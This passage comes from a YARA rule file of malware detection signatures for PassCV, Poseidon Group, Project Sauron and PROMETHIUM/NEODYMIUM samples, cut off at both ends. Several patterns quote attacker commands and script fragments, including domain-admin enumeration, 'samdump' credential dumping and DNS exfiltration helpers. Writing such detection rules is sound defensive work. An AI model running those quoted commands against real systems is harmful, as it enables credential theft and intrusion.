\"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Malware_Excalibur_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"F:\\\\Excalibur\\\\Excalibur\\\\\" ascii\n        $x2 = \"Excalibur\\\\bin\\\\Shell.pdb\" ascii\n        $x3 = \"SaberSvc.exe\" wide\n        $s1 = \"BBB.exe\" fullword wide\n        $s2 = \"AAA.exe\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 1 of ($x*) or all of ($s*)) or 3 of them\n}\n\nrule PassCV_Sabre_Malware_3\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = \"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Malware_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"NXKILL\" fullword wide\n        $s1 = \"2OLE32.DLL\" fullword ascii\n        $s2 = \"localspn.dll\" fullword wide\n        $s3 = \"!This is a Win32 program.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 8000KB and $x1 and 2 of ($s*))\n}\n\nrule PassCV_Sabre_Malware_4\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = \"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Malware_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"QWNjZXB0On\" fullword ascii\n        $s2 = \"VXNlci1BZ2VudDogT\" fullword ascii\n        $s3 = \"dGFzay5kbnME3luLmN\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 2 of them)\n}\n\nrule PassCV_Sabre_Tool_NTScan\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = \"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Tool_NTScan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"NTscan.EXE\" fullword wide\n        $x2 = \"NTscan Microsoft \" fullword wide\n        $s1 = \"admin$\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and 2 of them)\n}\n\nrule PassCV_Sabre_Malware_5\n{\n    meta:\n        description = \"PassCV Malware mentioned in Cylance Report\"\n        threat_names = \"PassCV\"\n        ref = \"https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PassCV_Sabre_Malware_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"ncircTMPg\" fullword ascii\n        $x2 = \"~SHELL#\" fullword ascii\n        $x3 = \"N.adobe.xm\" fullword ascii\n        $s1 = \"NEL32.DLL\" fullword ascii\n        $s2 = \"BitLocker.exe\" fullword wide\n        $s3 = \"|xtplhd\" fullword ascii\n        $s4 = \"SERVICECORE\" fullword wide\n        $s5 = \"SHARECONTROL\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 4000KB and 1 of ($x*) or all of ($s*))\n}\n\nrule PoseidonGroup_Malware\n{\n    meta:\n        description = \"Poseidon Group Malware\"\n        threat_names = \"Poseidon Group\"\n        ref = \"https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PoseidonGroup_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"c:\\\\winnt\\\\system32\\\\cmd.exe\" fullword ascii\n        $s2 = \"c:\\\\windows\\\\system32\\\\cmd.exe\" fullword ascii\n        $s3 = \"c:\\\\windows\\\\command.com\" fullword ascii\n        $s4 = \"copy \\\"%s\\\" \\\"%s\\\" /Y\" fullword ascii\n        $s5 = \"http://%s/files/\" fullword ascii\n        $s6 = \"\\\"%s\\\". %s: \\\"%s\\\".\" fullword ascii\n        $s7 = \"0x0666\" fullword ascii\n        $s8 = \"----------------This_is_a_boundary$\" fullword ascii\n        $s9 = \"Server 2012\" fullword ascii\n        $s10 = \"Server 2008\" fullword ascii\n        $s11 = \"Server 2003\" fullword ascii\n        $a1 = \"net.exe group \\\"Domain Admins\\\" /domain\" fullword ascii\n        $a2 = \"net.exe group \\\"Admins. do Dom\" fullword ascii\n        $a3 = \"(SVRID=%d)\" fullword ascii\n        $a4 = \"(TG=%d)\" fullword ascii\n        $a5 = \"(SVR=%s)\" fullword ascii\n        $a6 = \"Set-Cookie:\\\\b*{.+?}\\\\n\" fullword wide\n        $a7 = \"net.exe localgroup Administradores\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 650KB and 6 of ($s*)) or (4 of ($s*) and 1 of ($a*))\n}\n\nrule PoseidonGroup_MalDoc_1\n{\n    meta:\n        description = \"Poseidon Group - Malicious Word Document\"\n        threat_names = \"Poseidon Group\"\n        ref = \"https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PoseidonGroup_MalDoc_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"c:\\\\cmd32dll.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0xcfd0 and filesize < 500KB and all of them\n}\n\nrule PoseidonGroup_MalDoc_2\n{\n    meta:\n        description = \"Poseidon Group - Malicious Word Document\"\n        threat_names = \"Poseidon Group\"\n        ref = \"https://securelist.com/blog/research/73673/poseidon-group-a-targeted-attack-boutique-specializing-in-global-cyber-espionage/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PoseidonGroup_MalDoc_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"{\\\\*\\\\generator Msftedit 5.41.\" ascii\n        $s1 = \"Attachment 1: Complete Professional Background\" ascii\n        $s2 = \"E-mail:  \\\\cf1\\\\ul\\\\f1\"\n        $s3 = \"Education:\\\\par\" ascii\n        $s5 = \"@gmail.com\" ascii\n\n    condition:\n        uint32(0) == 0x74725c7b and filesize < 500KB and 3 of them\n}\n\nrule ProjectSauron_pipe_backdoor\n{\n    meta:\n        description = \"Project Sauron pipe backdoor\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_ProjectSauron_pipe_backdoor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"CreateNamedPipeW\" fullword ascii\n        $a2 = \"SetSecurityDescriptorDacl\" fullword ascii\n        $a3 = \"GetOverlappedResult\" fullword ascii\n        $a4 = \"TerminateThread\" fullword ascii\n        $a5 = \"%s%s%X\" fullword wide\n\n    condition:\n        uint16(0) == 0x5A4D and (all of ($a*)) and filesize < 100000\n}\n\nrule ProjectSauron_encrypted_LSA\n{\n    meta:\n        description = \"Project Sauron encrypted LSA sample\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_ProjectSauron_encrypted_LSA\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"EFEB0A9C6ABA4CF5958F41DB6A31929776C643DEDC65CC9B67AB8B0066FF2492\" fullword ascii\n        $a2 = \"\\\\Device\\\\NdisRaw_\" fullword ascii\n        $a3 = \"\\\\\\\\.\\\\GLOBALROOT\\\\Device\\\\{8EDB44DC-86F0-4E0E-8068-BD2CABA4057A}\" fullword wide\n        $a4 = \"Global\\\\{a07f6ba7-8383-4104-a154-e582e85a32eb}\" fullword wide\n        $a5 = \"Missing function %S::#%d\" fullword wide\n        $a6 = {8945D08D8598FEFFFF2BD08945D88D45BC83C20450C745C0030000008975C48955DCFF55FC8BF88D8F0000003A83F90977305333DB53FF15}\n        $a7 = {488D4C24304889442450488D452044886424304889442460488D4520C7442434030000002BD848897C243844896C244083C308895C246841FFD68D880000003A8BD883F909772DFF}\n\n    condition:\n        uint16(0) == 0x5A4D and (any of ($a*) or (pe.exports(\"InitializeChangeNotify\") and pe.exports(\"PasswordChangeNotify\") and math.entropy(0x400 , filesize) >= 7.5)) and filesize < 1000000\n}\n\nrule ProjectSauron_encrypted_SSPI\n{\n    meta:\n        description = \"Encrypted Project Sauron SSPI sample\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_ProjectSauron_encrypted_SSPI\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    condition:\n        uint16(0) == 0x5A4D and filesize < 1000000 and pe.exports(\"InitSecurityInterfaceA\") and pe.characteristics & pe.DLL and (pe.machine == pe.MACHINE_AMD64 or pe.machine == pe.MACHINE_IA64) and math.entropy(0x400 , filesize) >= 7.5\n}\n\nrule ProjectSauron_MyTrampoline\n{\n    meta:\n        description = \"Project Sauron MyTrampoline module\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_ProjectSauron_MyTrampoline\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \":\\\\System Volume Information\\\\{\" wide\n        $a2 = \"\\\\\\\\.\\\\PhysicalDrive%d\" wide\n        $a3 = \"DMWndClassX%d\"\n        $b1 = \"{774476DF-C00F-4e3a-BF4A-6D8618CFA532}\" ascii wide\n        $b2 = \"{820C02A4-578A-4750-A409-62C98F5E9237}\" ascii wide\n\n    condition:\n        uint16(0) == 0x5A4D and filesize < 5000000 and (all of ($a*) or any of ($b*))\n}\n\nrule ProjectSauron_encrypted_container\n{\n    meta:\n        description = \"Project Sauron sample encrypted container\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_ProjectSauron_encrypted_container\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $vfs_header = {02 AA 02 C1 02 0?}\n        $salt = {91 0A E0 CC 0D FE CE 36 78 48 9B 9C 97 F7 F5 55}\n\n    condition:\n        uint16(0) == 0x5A4D and ((@vfs_header < 0x4000) or $salt) and math.entropy(0x400 , filesize) >= 6.5 and (filesize > 0x400) and filesize < 10000000\n}\n\nrule ProjectSauron_encryption\n{\n    meta:\n        description = \"Project Sauron string encryption\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_ProjectSauron_encryption\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = {81??02AA02C175??8B??0685}\n        $a2 = {918D9A94CDCC939A93939BD18B9AB8DE9C908DAF8D9B9BBE8C8C9AFF}\n        $a3 = {803E225775??807E019F75??807E02BE75??807E0309}\n\n    condition:\n        filesize < 5000000 and any of ($a*)\n}\n\nrule ProjectSauron_generic_pipe_backdoor\n{\n    meta:\n        description = \"Project Sauron generic pipe backdoor\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://securelist.com/blog/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_ProjectSauron_generic_pipe_backdoor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = { C7 [2-3] 32 32 32 32 E8 }\n        $b = { 42 12 67 6B }\n        $c = { 25 31 5F 73 }\n        $d = \"rand\"\n        $e = \"WS2_32\"\n\n    condition:\n        uint16(0) == 0x5A4D and (all of them) and filesize < 400000\n}\n\nrule ProjectSauron_Scripts\n{\n    meta:\n        description = \"Script from Project Sauron report by Kaspersky\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_Scripts\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"local t = w.exec2str(\\\"regedit \"\n        $x2 = \"local r = w.exec2str(\\\"cat\"\n        $x3 = \"ap*.txt link*.txt node*.tun VirtualEncryptedNetwork.licence\"\n        $x4 = \"move O FakeVirtualEncryptedNetwork.dll\"\n        $x5 = \"sinfo | basex b 32url | dext l 30\"\n        $x6 = \"w.exec2str(execStr)\"\n        $x7 = \"netnfo irc | basex b 32url\"\n        $x8 = \"w.exec(\\\"wfw status\\\")\"\n        $x9 = \"exec(\\\"samdump\\\")\"\n        $x10 = \"cat VirtualEncryptedNetwork.ini|grep\"\n        $x11 = \"if string.lower(k) == \\\"securityproviders\\\" then\"\n        $x12 = \"exec2str(\\\"plist b | grep netsvcs\\\")\"\n        $x13 = \".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*\"\n        $x14 = \"SAURON_KBLOG_KEY =\"\n\n    condition:\n        1 of them\n}\n\nrule ProjectSauron_arping_module\n{\n    meta:\n        description = \"Project Sauron arping module\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_arping_module\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Resolve hosts that answer\"\n        $s2 = \"Print only replying Ips\"\n        $s3 = \"Do not display MAC addresses\"\n\n    condition:\n        all of them\n}\n\nrule ProjectSauron_kblogi_module\n{\n    meta:\n        description = \"Project Sauron kblogi module\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_kblogi_module\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Inject using process name or pid. Default\"\n        $s2 = \"Convert mode: Read log from file and convert to text\"\n        $s3 = \"Maximum running time in seconds\"\n\n    condition:\n        $x1 or 2 of them\n}\n\nrule ProjectSauron_basex_module\n{\n    meta:\n        description = \"Project Sauron basex module\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_basex_module\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"64, 64url, 32, 32url or 16.\"\n        $s2 = \"Force decoding when input is invalid/corrupt\"\n        $s3 = \"This cruft\"\n\n    condition:\n        $x1 or 2 of them\n}\n\nrule ProjectSauron_dext_module\n{\n    meta:\n        description = \"Project Sauron dext module\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_dext_module\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Assemble rows of DNS names back to a single string of data\"\n        $x2 = \"removes checks of DNS names and lengths (during split)\"\n        $x3 = \"Randomize data lengths (length/2 to length)\"\n        $x4 = \"This cruft\"\n\n    condition:\n        2 of them\n}\n\nrule ProjectSauron_Custom_M1\n{\n    meta:\n        description = \"Malware from Project Sauron APT\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FLorian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_Custom_M1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ncnfloc.dll\" fullword wide\n        $s4 = \"Network Configuration Locator\" fullword wide\n        $op0 = { 80 75 6e 85 c0 79 6a 66 41 83 38 0a 75 63 0f b7 }\n        $op1 = { 80 75 29 85 c9 79 25 b9 01 }\n        $op2 = { 2b d8 48 89 7c 24 38 44 89 6c 24 40 83 c3 08 89 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (all of ($s*)) and 1 of ($op*)) or (all of them)\n}\n\nrule ProjectSauron_Custom_M2\n{\n    meta:\n        description = \"Malware from Project Sauron APT\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FLorian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_Custom_M2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s2 = \"\\\\*\\\\3vpn\" fullword ascii\n        $op0 = { 55 8b ec 83 ec 0c 53 56 33 f6 39 75 08 57 89 75 }\n        $op1 = { 59 59 c3 8b 65 e8 ff 75 88 ff 15 50 20 40 00 ff }\n        $op2 = { 8b 4f 06 85 c9 74 14 83 f9 12 0f 82 a7 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and (all of ($s*)) and all of ($op*))\n}\n\nrule ProjectSauron_Custom_M3\n{\n    meta:\n        description = \"Malware from Project Sauron APT\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FLorian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_Custom_M3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ExampleProject.dll\" fullword ascii\n        $op0 = { 8b 4f 06 85 c9 74 14 83 f9 13 0f 82 ba }\n        $op1 = { ff 15 34 20 00 10 85 c0 59 a3 60 30 00 10 75 04 }\n        $op2 = { 55 8b ec ff 4d 0c 75 09 ff 75 08 ff 15 00 20 00 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and (all of ($s*)) and all of ($op*))\n}\n\nrule ProjectSauron_Custom_M4\n{\n    meta:\n        description = \"Malware from Project Sauron APT\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FLorian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_Custom_M4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"xpsmngr.dll\" fullword wide\n        $s2 = \"XPS Manager\" fullword wide\n        $op0 = { 89 4d e8 89 4d ec 89 4d f0 ff d2 3d 08 00 00 c6 }\n        $op1 = { 55 8b ec ff 4d 0c 75 09 ff 75 08 ff 15 04 20 5b }\n        $op2 = { 8b 4f 06 85 c9 74 14 83 f9 13 0f 82 b6 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 90KB and (all of ($s*)) and 1 of ($op*)) or (all of them)\n}\n\nrule ProjectSauron_Custom_M6\n{\n    meta:\n        description = \"Malware from Project Sauron APT\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FLorian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_Custom_M6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"rseceng.dll\" fullword wide\n        $s2 = \"Remote Security Engine\" fullword wide\n        $op0 = { 8b 0d d5 1d 00 00 85 c9 0f 8e a2 }\n        $op1 = { 80 75 6e 85 c0 79 6a 66 41 83 38 0a 75 63 0f b7 }\n        $op2 = { 80 75 29 85 c9 79 25 b9 01 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (all of ($s*)) and 1 of ($op*)) or (all of them)\n}\n\nrule ProjectSauron_Custom_M7\n{\n    meta:\n        description = \"Malware from Project Sauron APT\"\n        threat_names = \"Project Sauron\"\n        ref = \"https://goo.gl/eFoP4A\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"FLorian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Project_Sauron_Custom_M7\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $sx1 = \"Default user\" fullword wide\n        $sx2 = \"Hincorrect header check\" fullword ascii\n        $sa1 = \"MSAOSSPC.dll\" fullword ascii\n        $sa2 = \"MSAOSSPC.DLL\" fullword wide\n        $sa3 = \"MSAOSSPC\" fullword wide\n        $sa4 = \"AOL Security Package\" fullword wide\n        $sa5 = \"AOL Security Package\" fullword wide\n        $sa6 = \"AOL Client for 32 bit platforms\" fullword wide\n        $op0 = { 8b ce 5b e9 4b ff ff ff 55 8b ec 51 53 8b 5d 08 }\n        $op1 = { e8 0a fe ff ff 8b 4d 14 89 46 04 89 41 04 8b 45 }\n        $op2 = { e9 29 ff ff ff 83 7d fc 00 0f 84 cf 0a 00 00 8b }\n        $op3 = { 83 f8 0c 0f 85 3a 01 00 00 44 2b 41 6c 41 8b c9 }\n        $op4 = { 44 39 57 0c 0f 84 d6 0c 00 00 44 89 6f 18 45 89 }\n        $op5 = { c1 ed 02 83 c6 fe e9 68 fe ff ff 44 39 57 08 75 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and ((3 of ($s*) and 3 of ($op*)) or (1 of ($sx*) and 1 of ($sa*)))\n}\n\nrule PROMETHIUM_NEODYMIUM_Malware_1\n{\n    meta:\n        description = \"PROMETHIUM and NEODYMIUM malware\"\n        threat_names = \"PROMETHIUM, NEODYMIUM\"\n        ref = \"https://goo.gl/8abDE6\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PROMETHIUM_NEODYMIUM_Malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c:\\\\Windows\\\\system32\\\\syswindxr32.dll\" fullword wide\n        $s2 = \"c:\\\\windows\\\\temp\\\\TrueCrypt-Setup-7.1a-tamindir.exe\" fullword wide\n        $s3 = \"%s\\\\ssleay32.dll\" fullword wide\n        $s4 = \"%s\\\\libeay32.dll\" fullword wide\n        $s5 = \"%s\\\\fprot32.exe\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 10000KB and 3 of them) or (all of them)\n}\n\nrule PROMETHIUM_NEODYMIUM_Malware_2\n{\n    meta:\n        description = \"PROMETHIUM and NEODYMIUM malware\"\n        threat_names = \"PROMETHIUM, NEODYMIUM\"\n        ref = \"https://goo.gl/8abDE6\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PROMETHIUM_NEODYMIUM_Malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"winasys32.exe\" fullword ascii\n        $s2 = \"alg32.exe\" fullword ascii\n        $s3 = \"wmsrv32.exe\" fullword ascii\n        $s4 = \"vmnat32.exe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them) or (3 of them)\n}\n\nrule PROMETHIUM_NEODYMIUM_Malware_3\n{\n    meta:\n        description = \"PROMETHIUM and NEODYMIUM malware\"\n        threat_names = \"PROMETHIUM, NEODYMIUM\"\n        ref = \"https://goo.gl/8abDE6\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PROMETHIUM_NEODYMIUM_Malware_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s SslHandshakeDone(%d) %d. Secure connection with %s, cipher %s, %d secret bits (%d total), session reused=%s\" fullword ascii\n        $s2 = \"mvhost32.dll\" fullword ascii\n        $s3 = \"sdwin32.dll\" fullword ascii\n        $s4 = \"ofx64.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them) or (all of them)\n}\n\nrule PROMETHIUM_NEODYMIUM_Malware_4\n{\n    meta:\n        description = \"PROMETHIUM and NEODYMIUM malware\"\n        threat_names = \"PROMETHIUM, NEODYMIUM\"\n        ref = \"https://goo.gl/8abDE6\"\n        vti_default_score = 5\n        